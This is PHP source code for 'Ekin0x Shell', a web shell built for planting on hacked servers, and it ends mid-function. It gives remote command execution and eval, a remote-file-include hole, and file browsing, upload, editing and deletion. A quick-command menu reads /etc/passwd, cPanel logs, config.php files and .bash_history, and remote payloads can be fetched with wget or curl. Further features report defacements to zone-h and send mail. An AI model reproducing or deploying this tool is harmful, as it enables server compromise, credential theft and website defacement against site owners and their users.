                                          

<?               
/*########################################### 
Ekin0x Shell volume 2.1
Don't make any changes in c0de except if you dont know php programming
Thanx : VoLqaN | Entrika | Deep Emperor | H-B-V | xoron | AuGuSt27 and all Cyber-warrior.org Memberz

###########################################*/
$a = "http://";
$b = "php-shell.org";
$c = "/x.html";

error_reporting(0); 
set_magic_quotes_runtime(0);

if(version_compare(phpversion(), '4.1.0') == -1)
 {$_POST   = &$HTTP_POST_VARS;$_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
 }function inclink($link,$val){$requ=$_SERVER["REQUEST_URI"];
if (strstr ($requ,$link)){return preg_replace("/$link=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}elseif (strstr ($requ,"showsc")){return preg_replace("/showsc=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}
elseif (strstr ($requ,"hlp")){return preg_replace("/hlp=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}elseif (strstr($requ,"?")){return $requ."&".$link."=".$val;}
else{return $requ."?".$link."=".$val;}}
function delm($delmtxt){print"<center><table bgcolor=Black  style='border:1px solidDeepSkyBlue  ' width=99% height=2%>";print"<tr><td><b><center><font size=3 color=DeepSkyBlue >$delmtxt</td></tr></table></center>";}
function callfuncs($cmnd){if (function_exists(shell_exec)){$scmd=shell_exec($cmnd);
$nscmd=htmlspecialchars($scmd);print $nscmd;}
elseif(!function_exists(shell_exec)){exec($cmnd,$ecmd);
$ecmd = join("\n",$ecmd);$necmd=htmlspecialchars($ecmd);print $necmd;}
elseif(!function_exists(exec)){$pcmd = popen($cmnd,"r");
while (!feof($pcmd)){ $res = htmlspecialchars(fgetc($pcmd));;
print $res;}pclose($pcmd);}elseif(!function_exists(popen)){ 
ob_start();system($cmnd);$sret = ob_get_contents();ob_clean();print htmlspecialchars($sret);}elseif(!function_exists(system)){
ob_start();passthru($cmnd);$pret = ob_get_contents();ob_clean();
print htmlspecialchars($pret);}}
function input($type,$name,$value,$size)
{if (empty($value)){print "<input type=$type name=$name size=$size>";}
elseif(empty($name)&&empty($size)){print "<input type=$type value=$value >";}
elseif(empty($size)){print "<input type=$type name=$name value=$value >";}
else {print "<input type=$type name=$name value=$value size=$size >";}}
function permcol($path){if (is_writable($path)){print "<font color=red>";
callperms($path); print "</font>";}
elseif (!is_readable($path)&&!is_writable($path)){print "<font color=DeepSkyBlue  >";
callperms($path); print "</font>";}
else {print "<font color=DeepSkyBlue >";callperms($path);}}
if ($dlink=="dwld"){download($_REQUEST['dwld']);}
function download($dwfile) {$size = filesize($dwfile);
@header("Content-Type: application/force-download;name=$dwfile");
@header("Content-Transfer-Encoding: binary");
@header("Content-Length: $size");
@header("Content-Disposition: attachment; filename=$dwfile");
@header("Expires: 0");
@header("Cache-Control: no-cache, must-revalidate");
@header("Pragma: no-cache");
@readfile($dwfile); exit;}
?>
<? include $_GET['baba']; ?>
<html> 
<head><title>Ekin0x Shell</title></head>
<style> 
BODY { SCROLLBAR-BASE-COLOR: DeepSkyBlue ; SCROLLBAR-ARROW-COLOR: red; } 
a{color:#dadada;text-decoration:none;font-family:tahoma;font-size:13px}
a:hover{color:red}
input{FONT-WEIGHT:normal;background-color: #000000;font-size: 12px; color: #dadada; font-family: Tahoma; border: 1px solid #666666;height:17}
textarea{background-color:#191919;color:#dadada;font-weight:bold;font-size: 12px;font-family: Tahoma; border: 1 solid #666666;}
div{font-size:12px;font-family:tahoma;font-weight:normal;color:DeepSkyBlue  smoke}
select{background-color: #191919; font-size: 12px; color: #dadada; font-family: Tahoma; border: 1 solid #666666;font-weight:bold;}</style> 
<body bgcolor=black text=DeepSkyBlue ><font face="sans ms" size=3> 
</body> 
</html> 
<?
$nscdir =(!isset($_REQUEST['scdir']))?getcwd():chdir($_REQUEST['scdir']);$nscdir=getcwd();

$sf="<form method=post>";$ef="</form>";
$st="<table style=\"border:1px #dadada solid \" width=100% height=100%>";
$et="</table>";$c1="<tr><td height=22% style=\"border:1px #dadada solid \">";
$c2="<tr><td style=\"border:1px #dadada solid \">";$ec="</tr></td>";
$sta="<textarea cols=157 rows=23>";$eta="</textarea>";
$sfnt="<font face=tahoma size=2 color=DeepSkyBlue  >";$efnt="</font>";
################# Ending of common variables ########################

print"<table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>";print"<tr><td>"; print"<b><center><font face=tahoma color=DeepSkyBlue   size=6>    ## Ekin0x Shell ## 
</font></b></center>"; print"</td></tr>";print"</table>";print "<br>";
print"<table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>";print"<tr><td>"; print"<center><div><b>";print "<a href=".inclink('dlink', 'home').">Home</a>";
print " - <a href='javascript:history.back()'>Geri</a>";
print " - <a target='_blank' href=".inclink('dlink', 'phpinfo').">phpinfo</a>";
if ($dlink=='phpinfo'){print phpinfo();die();}
print " - <a href=".inclink('dlink', 'basepw').">Base64 decode</a>";
print " - <a href=".inclink('dlink', 'urld').">Url decode</a>"; 
print " - <a href=".inclink('dlink', 'urlen').">Url encode</a>"; 
print " - <a href=".inclink('dlink', 'mdf').">Md5</a>";
print " - <a href=".inclink('dlink', 'perm')."&scdir=$nscdir>Izinleri Kontrol Et</a>";
print " - <a href=".inclink('dlink', 'showsrc')."&scdir=$nscdir>File source</a>";
print " - <a href=".inclink('dlink', 'qindx')."&scdir=$nscdir>Quick index</a>";
print " - <a href=".inclink('dlink', 'zone')."&scdir=$nscdir>Zone-h</a>";
print " - <a href=".inclink('dlink', 'mail')."&scdir=$nscdir>Mail</a>";
print " - <a href=".inclink('dlink', 'cmdhlp')."&scdir=$nscdir>Cmd help</a>";
if (isset ($_REQUEST['ncbase'])){$cbase =(base64_decode ($_REQUEST['ncbase']));  
print "<p>Result is : $sfnt".$cbase."$efnt";  die();}
if ($dlink=="basepw"){ print "<p><b>[ Base64 - Decoder ]</b>"; 
print $sf;input ("text","ncbase",$ncbase,35);print " "; 
input ("submit","","Decode","");print $ef; die();}
if (isset ($_REQUEST['nurld'])){$urldc =(urldecode ($_REQUEST['nurld']));  
print "<p>Result is : $sfnt".$urldc."$efnt";  die();}if ($dlink=='urld'){
print "<p><b>[ Url - Decoder ]</b>";   print $sf;
input ("text","nurld",$nurld,35);print " "; 
input ("submit","","Decode","");print $ef; die();}
if (isset ($_REQUEST['nurlen'])){$urlenc =(urlencode (stripslashes($_REQUEST['nurlen'])));  print "<p>Result is : $sfnt".$urlenc."$efnt";  die();}
if ($dlink=='urlen'){print "<p><b>[ Url - Encoder ]</b>";   
print $sf;input ("text","nurlen",$nurlen,35);print " "; input ("submit","","Encode","");print $ef; die();}
if (isset ($_REQUEST['nmdf'])){$mdfe =(md5 ($_REQUEST['nmdf']));  
print "<p>Result is : $sfnt".$mdfe."$efnt";  die();}if ($dlink=='mdf'){ 
print "<p><b>[ MD5 - Encoder ]</b>"; 
print $sf;input ("text","nmdf",$nmdf,35);print " ";
input ("hidden","scdir",$scdir,22); input ("submit","","Encode","");print $ef;die(); }if ($dlink=='perm'){print $sf;input("submit","mfldr","Main-fldr","");print " ";input("submit","sfldr","Sub-fldr","");print $ef;
print "<pre>";print "<p><textarea cols=120 rows=12>";
if (isset($_REQUEST['mfldr'])){callfuncs('find . -type d -perm -2 -ls');
}elseif (isset($_REQUEST['sfldr'])){callfuncs('find ../ -type d -perm -2 -ls');
}print "</textarea>";print "</pre>";die();}
function callshsrc($showsc){if(isset($showsc)&&filesize($showsc)=="0"){
print "<p><b>[ Sorry, U choosed an empty file or the file not exists ]";die();}
elseif(isset($showsc)&&filesize($showsc) !=="0") {
print "<p><table width=100% height=10% bgcolor=#dadada border=1><tr><td>";
if (!show_source($showsc)||!function_exists('show_source')){print "<center><font color=black size=2><b>[ Sorry can't complete the operation ]</font></center>";die();}print "</td></tr></table>";die();}}if ($dlink=='showsrc'){
print "<p><b>: Choose a php file to view in a color mode, any extension else will appears as usual :";print "<form method=get>";
input ("text","showsc","",35);print " ";
input ("hidden","scdir",$scdir,22);input ("submit","subshsc","Show-src","");print $ef; die();}if(isset($_REQUEST['showsc'])){callshsrc(trim($_REQUEST['showsc']));}
if ($dlink=='cmdhlp'){
print "<p><b>: Insert the command below to get help or to know more about it's uses :";print "<form method=get>";
input ("text","hlp","",35);print " "; 
input ("submit","","Help","");print $ef; die();}
if (isset ($_REQUEST['hlp'])){$hlp=$_REQUEST['hlp'];
print "<p><b>[ The command is $sfnt".$hlp."$efnt ]";
$hlp = escapeshellcmd($hlp);print "<p><table width=100% height=30% bgcolor=#dadada border=2><tr><td>";
if (!function_exists(shell_exec)&&!function_exists(exec)&&
!function_exists(popen)&&!function_exists(system)&&!function_exists(passthru))
{print "<center><font color=black size=2><b>[ Sorry can't complete the operation ]</font></center>";}else {print "<pre><font color=black>";
if(!callfuncs("man $hlp | col -b")){print "<center><font size=2><b>[ Finished !! ]";}print "</pre></font>";}print "</td></tr></table>";die();}
if (isset($_REQUEST['indx'])&&!empty($_REQUEST['indxtxt']))
{if (touch ($_REQUEST['indx'])==true){
$fp=fopen($_REQUEST['indx'],"w+");fwrite ($fp,stripslashes($_REQUEST['indxtxt']));
fclose($fp);print "<p>[ $sfnt".$_REQUEST['indx']."$efnt created successfully !! ]</p>";print "<b><center>[ <a href='javascript:history.back()'>Yeniden Editle</a>
] -- [<a href=".inclink('dlink', 'scurrdir')."&scdir=$nscdir> Curr-Dir </a>]</center></b>";die(); }else {print "<p>[ Sorry, Can't create the index !! ]</p>";die();}}
if ($dlink=='qindx'&&!isset($_REQUEST['qindsub'])){
print $sf."<br>";print "<p><textarea cols=50 rows=10 name=indxtxt>
Your index contents here</textarea></p>";
input ("text","indx","Index-name",35);print " ";
input ("submit","qindsub","Create","");print $ef;die();}
if (isset ($_REQUEST['mailsub'])&&!empty($_REQUEST['mailto'])){
$mailto=$_REQUEST['mailto'];$subj=$_REQUEST['subj'];$mailtxt=$_REQUEST['mailtxt'];
if (mail($mailto,$subj,$mailtxt)){print "<p>[ Mail sended to $sfnt".$mailto." $efnt successfully ]</p>"; die();}else {print "<p>[ Error, Can't send the mail ]</p>";die();}} elseif(isset ($mailsub)&&empty($mailto)) {print "<p>[ Error, Can't send the mail ]</p>";die();}
if ($dlink=='mail'&&!isset($_REQUEST['mailsub'])){
print $sf."<br>";print "<p><textarea cols=50 rows=10 name=mailtxt>
Your message here</textarea></p>";input ("text","mailto","example@mail.com",35);print " ";input ("text","subj","Title-here",20);print " ";
input ("submit","mailsub","Send-mail","");print $ef;die();}
if (isset($_REQUEST['zonet'])&&!empty($_REQUEST['zonet'])){callzone($nscdir);}
function callzone($nscdir){
if (is_writable($nscdir)){$fpz=fopen ("z.pl","w");$zpl='z.pl';$li="bklist.txt";}
else {$fpz=fopen ("/tmp/z.pl","w");$zpl='/tmp/z.pl';$li="/tmp/bklist.txt";}
fwrite ($fpz,"\$arq = @ARGV[0];
\$grupo = @ARGV[1];
chomp \$grupo;
open(a,\"<\$arq\");
@site = <a>;
close(a);
\$b = scalar(@site);
for(\$a=0;\$a<=\$b;\$a++)
{chomp \$site[\$a];
if(\$site[\$a] =~ /http/) { substr(\$site[\$a], 0, 7) =\"\"; }
print \"[+] Sending \$site[\$a]\n\";
use IO::Socket::INET;
\$sock = IO::Socket::INET->new(PeerAddr => \"old.zone-h.org\", PeerPort => 80, Proto => \"tcp\") or next;
print \$sock \"POST /en/defacements/notify HTTP/1.0\r\n\";
print \$sock \"Accept: */*\r\n\";
print \$sock \"Referer: http://old.zone-h.org/en/defacements/notify\r\n\";
print \$sock \"Accept-Language: pt-br\r\n\";
print \$sock \"Content-Type: application/x-www-form-urlencoded\r\n\";
print \$sock \"Connection: Keep-Alive\r\n\";
print \$sock \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n\";
print \$sock \"Host: old.zone-h.org\r\n\";
print \$sock \"Content-Length: 385\r\n\";
print \$sock \"Pragma: no-cache\r\n\";
print \$sock \"\r\n\";
print \$sock \"notify_defacer=\$grupo&notify_domain=http%3A%2F%2F\$site[\$a]&notify_hackmode=22&notify_reason=5&notify=+OK+\r\n\";
close(\$sock);}");
if (touch ($li)==true){$fpl=fopen($li,"w+");fwrite ($fpl,$_REQUEST['zonetxt']);
}else{print "<p>[ Can't complete the operation, try change the current dir with writable one ]<br>";}$zonet=$_REQUEST['zonet'];
if (!function_exists(exec)&&!function_exists(shell_exec)&&!function_exists(popen)&&!function_exists(system)&&!function_exists(passthru))
{print "[ Can't complete the operation !! ]";}
else {callfuncs("chmod 777 $zpl;chmod 777 $li");
ob_start();callfuncs("perl $zpl $li $zonet");ob_clean();
print "<p>[ All sites should be sended to zone-h.org successfully !! ]";die();}
}if ($dlink=='zone'&&!isset($_REQUEST['zonesub'])){
print $sf."<br>";print "<p><pre><textarea cols=50 rows=10 name=zonetxt>
www.site1.com
www.site2.com
</textarea></pre></p>";input ("text","zonet","Hacker-name",35);print " ";
input ("submit","zonesub","Send","");print $ef;die();}
print "</div></b></center>"; print"</td></tr>";print"</table>";print "<br>";
function inisaf($iniv) { $chkini=ini_get($iniv);
if(($chkini || strtolower($chkini)) !=='on'){print"<font color=DeepSkyBlue ><b>Kapali ( Guvenlik Yok )</b></font>";} else{
print"<font color=red><b>Acik ( Guvenli )</b></font>";}}function inifunc($inif){$chkin=ini_get($inif);
if ($chkin==""){print " <font color=red><b>None</b></font>";}
else {$nchkin=wordwrap($chkin,40,"\n", 1);print "<b><font color=DeepSkyBlue  >".$nchkin."</font></b>";}}function callocmd($ocmd,$owhich){if(function_exists(exec)){$nval=exec($ocmd);}elseif(!function_exists(exec)){$nval=shell_exec($ocmd);}
elseif(!function_exists(shell_exec)){$opop=popen($ocmd,'r');
while (!feof($opop)){ $nval= fgetc($opop);}}
elseif(!function_exists(popen)){ ob_start();system($ocmd);$nval=ob_get_contents();ob_clean();}elseif(!function_exists(system)){
ob_start();passthru($ocmd);$nval=ob_get_contents();ob_clean();}
if($nval=$owhich){print"<font color=red><b>ON</b></font>";}
else{print"<font color=DeepSkyBlue  ><b>OFF</b></font>";} }
print"<table bgcolor=#191919 style=\"border:2px #dadada solid ;font-size:13px;font-family:tahoma \" width=100% height=%>"; 
print"<tr><td>"; print"<center><br>";
print"<b>Safe-mode :\t";print inisaf('safe_mode');print "</b>";print"</center>"; 
if (!function_exists(exec)&&!function_exists(shell_exec)&&!function_exists(popen)&&!function_exists(system)&&!function_exists(passthru)||strstr(PHP_OS,"WIN")){print "";}else{print "<table bgcolor=#191919 width=100% height=% style='font-size:13px;font-family:tahoma'><tr><td>"; 
print "<div align=center>"; print"<br><b>Mysql : </b>"; 
callocmd('which mysql','/usr/bin/mysql'); 
print"</td>"; print"<td>"; print"<br><b>Perl : </b>"; 
callocmd('which perl',('/usr/bin/perl')||'/usr/local/bin/perl');print"</td>"; print"<td>"; print"<br><b>Gcc : </b>"; 
callocmd('which gcc','/usr/bin/gcc'); print"</td>"; print"<td>"; 
print"<br><b>Curl : </b>"; callocmd('which curl','/usr/bin/curl'); print"</td>"; print"<td>"; print"<br><b>GET : </b>"; 
callocmd('which GET','/usr/bin/GET'); 
print"</td>"; print"<td>";print"<br><b>Wget : </b>"; 
callocmd('which wget','/usr/bin/wget'); 
print"</td>"; print"<td>"; print"<br><b>Lynx : </b>"; 
callocmd('which lynx','/usr/bin/lynx'); 
print"</td>"; print "</tr></table>"; }print "<hr><br>"; 
print "<b>IP Numaran : ".$REMOTE_ADDR."<br></b>"; 
print "<b>Server IP : ".$SERVER_ADDR."</b>";
print"<br><b>".$SERVER_SIGNATURE."</b>"; 
print "<b>Server ADI : ".$SERVER_NAME." / "."Email : ".$SERVER_ADMIN."<br></b>"; 
print "<b>Engelli Fonksiyonlar : </b>";inifunc(disable_functions);print"<br>";
print "<b>Kimsin : <b>"; callfuncs('id');print"<br><b>Os : </b>"; 
if (strstr( PHP_OS, "WIN")){print php_uname(); print " ";print PHP_OS; }else {
if (!function_exists(shell_exec)&&!function_exists(exec)&&
!function_exists(popen)&&!function_exists(system)&&!function_exists(passthru))
{print php_uname(); print "/";print PHP_OS;}
else {callfuncs('uname -a');}}print"<br>"; 
print"Php-versiyon : ".phpversion(); print"<br><b>Current-path : </b>";
print $nscdir."&nbsp;&nbsp;&nbsp;&nbsp; [ ";permcol($nscdir);print " ]";
print"<br>";print "Shell'in Burda : " .__file__;
print"<br> Toplam Alan: "; readable_size(disk_total_space($nscdir));print " / ";
print"Bos Alan: "; readable_size(disk_free_space($nscdir));
print "</center><br></font>"; print"</td></tr></table><br>"; 
if (isset($_REQUEST['credir'])) { $ndir=trim($_REQUEST['dir']); 
if (mkdir( $ndir, 0777 )){ $mess=basename($ndir)." created successfully"; }
else{$mess="Klasör Olustur/Sil";}}elseif (isset($_REQUEST['deldir'])) 
{ $nrm=trim($_REQUEST['dir']);if (is_dir($nrm)&& rmdir($nrm)){$mess=basename($nrm)." deleted successfully"; }else{$mess="Create/Delete Dir";}} 
else{$mess="Klasör Olustur/Sil";}if(isset($_REQUEST['crefile'])){ 
$ncfile=trim($_REQUEST['cfile']);
if (!is_file($ncfile)&&touch($ncfile)){ $mess3=basename($ncfile)." created succefully";unset ($_REQUEST['cfile']);} 
else{ $mess3= "Dosya Olustur/Sil";}}
elseif(isset($_REQUEST['delfile'])){ 
$ndfile=trim($_REQUEST['cfile']); 
if (unlink($ndfile)) {$mess3=basename($ndfile)." deleted succefully";} 
else {$mess3= "Dosya Olustur/Sil";}} 
else {$mess3="Dosya Olustur/Sil";}
class upload{ function upload($file,$tmp){ 
$nscdir =(!isset($_REQUEST['scdir']))?getcwd():chdir($_REQUEST['scdir']);$nscdir=getcwd();if (isset($_REQUEST["up"])){ if (empty($upfile)){print "";}
if (@copy($tmp,$nscdir."/".$file)){ 
print "<div><center><b>:<font color=DeepSkyBlue  > $file </font>uploaded successfully :</b></center></div>"; }else{print "<center><b>: Error uploading<font color=red> $file </font>: </b></center>";} } } } 
$obj=new upload($HTTP_POST_FILES['upfile']['name'],$HTTP_POST_FILES['upfile']['tmp_name']); if (isset ($_REQUEST['ustsub'])){
$ustname=trim ($_REQUEST['ustname']);ob_start();
if ($_REQUEST['ustools']='t1'){callfuncs('wget '.$ustname);}
if ($_REQUEST['ustools']='t2'){callfuncs('curl -o basename($ustname) $ustname');}
if ($_REQUEST['ustools']='t3'){callfuncs('lynx -source $ustname > basename($ustname)');}
if ($_REQUEST['ustools']='t9'){callfuncs('GET $ustname > basename($ustname)');}
if ($_REQUEST['ustools']='t4'){callfuncs('unzip '.$ustname);}
if ($_REQUEST['ustools']='t5'){callfuncs('tar -xvf '.$ustname);}
if ($_REQUEST['ustools']='t6'){callfuncs('tar -zxvf '.$ustname);}
if ($_REQUEST['ustools']='t7'){callfuncs('chmod 777 '.$ustname);}
if ($_REQUEST['ustools']='t8'){callfuncs('make '.$ustname);}ob_clean();}
if (!isset($_REQUEST['cmd'])&&!isset($_REQUEST['eval'])&&!isset($_REQUEST['rfile'])&&!isset($_REQUEST['edit'])&&!isset($_REQUEST['subqcmnds'])&&!isset ($_REQUEST['safefile'])&&!isset ($_REQUEST['inifile'])&&!isset($_REQUEST['bip'])&&
!isset($_REQUEST['rfiletxt'])){
if ($dh  = dir($nscdir)){ while (true == ($filename =$dh->read())){ 
$files[] = $filename; sort($files);}print "<br>"; 
print"<center><table bgcolor=#2A2A2A style=\"border:1px solid black\" width=100% height=6% ></center>"; 
print "<tr><td width=43% style=\"border:1px solid black\">"; 
print "<center><b>Dosyalar";print "</td>"; 
print "<td width=8% style=\"border:1px solid black\">";print "<center><b>Boyut";print "</td>"; 
print "<td width=3% style=\"border:1px solid black\">";print "<center><b>Yazma";print "</td>"; 
print "<td width=3% style=\"border:1px solid black\">";print "<center><b>Okuma";print "</td>"; 
print "<td width=5% style=\"border:1px solid black\">";print "<center><b>Tür";print "</td>"; 
print "<td width=5% style=\"border:1px solid black\">";print "<center><b>Düzenleme";print "</td>";
print "<td width=5% style=\"border:1px solid black\">";print "<center><b>Adlandirma";print "</td>";
print "<td width=6% style=\"border:1px solid black\">";print "<center><b>Indir";print "</td>";if(strstr(PHP_OS,"Linux")){
print "<td width=8% style=\"border:1px solid black\">";print "<center><b>Group";print "</td>";}
print "<td width=8% style=\"border:1px solid black\">";print "<center><b>Izinler";print "</td></tr>"; foreach ($files as $nfiles){ 
if (is_file("$nscdir/$nfiles")){ $scmess1=filesize("$nscdir/$nfiles");}
if (is_writable("$nscdir/$nfiles")){ 
$scmess2= "<center><font color=DeepSkyBlue  >Evet";}else {$scmess2="<center><font color=red>Hayir";}if (is_readable("$nscdir/$nfiles")){ 
$scmess3= "<center><font color=DeepSkyBlue  >Evet";}else {$scmess3= "<center><font color=red>Hayir";}if (is_dir("$nscdir/$nfiles")){$scmess4= "<font color=red><center>Klasör";}else{$scmess4= "<center><font color=DeepSkyBlue  >Dosya";} 
print"<tr><td style=\"border:1px solid black\">"; 
if (is_dir($nfiles)){print "<font face= tahoma size=2 color=DeepSkyBlue  >[ $nfiles    ]<br>";}else {print "<font face= tahoma size=2 color=#dadada>$nfiles <br>";}
print"</td>"; print "<td style=\"border:1px solid black\">"; 
print "<center><font face= tahoma size=2 color=#dadada>";
if (is_dir("$nscdir/$nfiles")){print "<b>K</b>lasör";}
elseif(is_file("$nscdir/$nfiles")){readable_size($scmess1);}else {print "---";}
print "</td>"; print "<td style=\"border:1px solid black\">"; 
print "<center><font face= tahoma size=2 >$scmess2"; print "</td>"; 
print"<td style=\"border:1px solid black\">"; 
print "<center><font face= tahoma size=2 >$scmess3"; print "</td>"; 
print "<td style=\"border:1px solid black\">"; 
print "<center><font face= tahoma size=2 >$scmess4"; print"</td>";
print "<td style=\"border:1px solid black\">";if(is_file("$nscdir/$nfiles")){
print " <center><a href=".inclink('dlink', 'edit')."&edit=$nfiles&scdir=$nscdir>Düzenle</a>";}else {print "<center><font face=tahoma size=2 color=gray>Düzenle</center>";}print"</td>";  print "<td style=\"border:1px solid black\">";print " <center><a href=".inclink('dlink', 'ren')."&ren=$nfiles&scdir=$nscdir>Adlandir</a>";print"</td>";print "<td style=\"border:1px solid black\">";
if(is_file("$nscdir/$nfiles")){
print " <center><a href=".inclink('dlink', 'dwld')."&dwld=$nfiles&scdir=$nscdir>indir</a>";}else {print "<center><font face=tahoma size=2 color=gray>indir</center>";}print"</td>"; if(strstr(PHP_OS,"Linux")){
print "<td style=\"border:1px solid black\">";
print "<center><font face=tahoma size=2 color=#dadada>";owgr($nfiles);
print "</center>";print"</td>";} 
print "<td style=\"border:1px solid DeepSkyBlue  \">";print "<center><div>";
permcol("$nscdir/$nfiles");print "</div>";print"</td>"; print "</tr>"; 
}print "</table>";print "<br>";}else {print "<div><br><center><b>[ Can't open the Dir, permission denied !! ]<p>";}}
elseif (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])||isset($_REQUEST['eval'])||isset($_REQUEST['subqcmnds'])){
if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print "<div><b><center>[ Executed command ][$] : ".$_REQUEST['cmd']."</div></center>";}
print "<pre><center>".$sta;
if (isset($_REQUEST['cmd'])){$cmd=trim($_REQUEST['cmd']);callfuncs($cmd);}
elseif(isset($_REQUEST['eval'])){
ob_start();eval(stripslashes(trim($_REQUEST['eval'])));
$ret = ob_get_contents();ob_clean();print htmlspecialchars($ret);}
elseif (isset($_REQUEST['subqcmnds'])){
if ($_REQUEST['uscmnds']=='op1'){callfuncs('ls -lia');}
if ($_REQUEST['uscmnds']=='op2'){callfuncs('cat /etc/passwd');}
if ($_REQUEST['uscmnds']=='op3'){callfuncs('cat /var/cpanel/accounting.log');}
if ($_REQUEST['uscmnds']=='op4'){callfuncs('ls /var/named');}
if ($_REQUEST['uscmnds']=='op11'){callfuncs('find ../ -type d -perm -2 -ls');}
if ($_REQUEST['uscmnds']=='op12'){callfuncs('find ./ -type d -perm -2 -ls');}
if ($_REQUEST['uscmnds']=='op5'){callfuncs('find ./ -name service.pwd ');}
if ($_REQUEST['uscmnds']=='op6'){callfuncs('find ./ -name config.php');}
if ($_REQUEST['uscmnds']=='op7'){callfuncs('find / -type f -name .bash_history');}
if ($_REQUEST['uscmnds']=='op8'){callfuncs('cat /etc/hosts');}
if ($_REQUEST['uscmnds']=='op9'){callfuncs('finger root');}
if ($_REQUEST['uscmnds']=='op10'){callfuncs('netstat -an | grep -i listen');}
if ($_REQUEST['uscmnds']=='op13'){callfuncs('cat /etc/services');}
}print $eta."</center></pre>";}
function rdread($nscdir,$sf,$ef){$rfile=trim($_REQUEST['rfile']);
if(is_readable($rfile)&&is_file($rfile)){ 
$fp=fopen ($rfile,"r");print"<center>";
print "<div><b>[ Editing <font color=DeepSkyBlue  >".basename($rfile)."</font> ] [<a href='javascript:history.back()'> Geri </a>] [<a href=".inclink('dlink','rdcurrdir')."&scdir=$nscdir> Curr-Dir </a>]</b></div><br>"; 
print $sf."<textarea cols=157 rows=23 name=rfiletxt>"; 
while (!feof($fp)){$lines = fgetc($fp);
$nlines=htmlspecialchars($lines);print $nlines;}
fclose($fp);print "</textarea>";if (is_writable($rfile)){
print "<center><input type=hidden value=$rfile name=hidrfile><input type=submit value='Save-file' > <input type=reset value='Reset' ></center>".$ef;}else 
{print "<div><b><center>[ Can't edit <font color=DeepSkyBlue  >".basename($rfile)."</font> ]</center></b></div><br>";}print "</center><br>";}
elseif (!file_exists($_REQUEST['rfile'])||!is_readable($_REQUEST['rfile'])||$_REQUEST['rfile']=$nscdir){print "<div><b><center>[ You selected a wrong file name or you don't have access !! ]</center></b></div><br>";}}
function rdsave($nscdir){$hidrfile=trim($_REQUEST['hidrfile']);
if (is_writable($hidrfile)){$rffp=fopen ($hidrfile,"w+");
$rfiletxt=stripslashes($_REQUEST['rfiletxt']);
fwrite ($rffp,$rfiletxt);print "<div><b><center>
[ <font color=DeepSkyBlue >".basename($hidrfile)."</font> Saved !! ]
[<a href=".inclink('dlink','rdcurrdir')."&scdir=$nscdir> Curr-Dir </a>] [<a href='javascript:history.back()'> Edit again </a>]
</center></b></div><br>";fclose($rffp);}
else {print "<div><b><center>[ Can't save the file !! ] [<a href=".inclink('dlink','rdcurrdir')."&scdir=$nscdir> Curr-Dir </a>] [<a href='javascript:history.back()'> Back </a>]</center></b></div><br>";}} 
if (isset ($_REQUEST['rfile'])&&!isset($_REQUEST['cmd'])){rdread($nscdir,$sf,$ef);}
elseif (isset($_REQUEST['rfiletxt'])){rdsave($nscdir);}
function callperms($chkperms){
$perms = fileperms($chkperms);

if (($perms & 0xC000) == 0xC000) {
   // Socket
   $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
   // Symbolic Link
   $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
   // Regular
   $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
   // Block special
   $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
   // Directory
   $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
   // Character special
   $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
   // FIFO pipe
   $info = 'p';
} else {
   // Unknown
   $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
           (($perms & 0x0800) ? 's' : 'x' ) :
           (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
           (($perms & 0x0400) ? 's' : 'x' ) :
           (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
           (($perms & 0x0200) ? 't' : 'x' ) :
           (($perms & 0x0200) ? 'T' : '-'));    print $info;}

		  function readable_size($size) {

if ($size < 1024) {
print $size . ' B';
}else {$units = array("kB", "MB", "GB", "TB");
foreach ($units as $unit) {
$size = ($size / 1024);
if ($size < 1024) {break;}}printf ("%.2f",$size);print ' ' . $unit;}}
if($dlink=='ren'&&!isset($_REQUEST['rensub'])){
print "<div><b><center>[<a href=".$PHP_SELF."?scdir=$nscdir> Geri </a>]</div>";
print "<center>".$sf;input ("text","ren",$_REQUEST['ren'],20);print " ";
input ("text","renf","New-name",20);print " ";
input ("submit","rensub","Rename" ,"");print $ef;die();}else print "";
if (isset ($_REQUEST['ren'])&&isset($_REQUEST['renf'])){
if (rename($nscdir."/".$_REQUEST['ren'],$nscdir."/".$_REQUEST['renf'])){
print"<center><div><b>[ ". $_REQUEST['ren']." is renamed to " .$sfnt.$_REQUEST['renf'].$efnt." successfully ]</center></div></b>";print "<div><b><center>[<a href=".inclink('dlink', 'rcurrdir')."&scdir=$nscdir> Curr-dir </a>]</div>";die();}else{print "<div><b><center>[ Yeniden Adlandirilamiyor ]</div>";
print "<div><b><center>[<a href=".inclink('dlink', 'rcurrdir')."&scdir=$nscdir> Geri </a>]</div>";die();}}function fget($nscdir,$sf,$ef){print "<center>";
print "<div><b>[ Editing <font color=DeepSkyBlue >".basename($_REQUEST['edit'])."</font> ] [<a href='javascript:history.back()'> Geri </a>] [<a href=".inclink('dlink', 'scurrdir')."&scdir=$nscdir> Curr-Dir </a>]</b></div>";
print $sf."<textarea cols=157 rows=23 name=edittxt>";  
$alltxt= file_get_contents($_REQUEST['edit']);
$nalltxt=htmlspecialchars($alltxt);print $nalltxt;print "</textarea></center>";
if (is_writable($_REQUEST['edit'])){
print "<center><input type=submit value='Save-file' > <input type=reset value='Reset' ></center>".$ef;}else {print "<div><b><center>[ Can't edit 
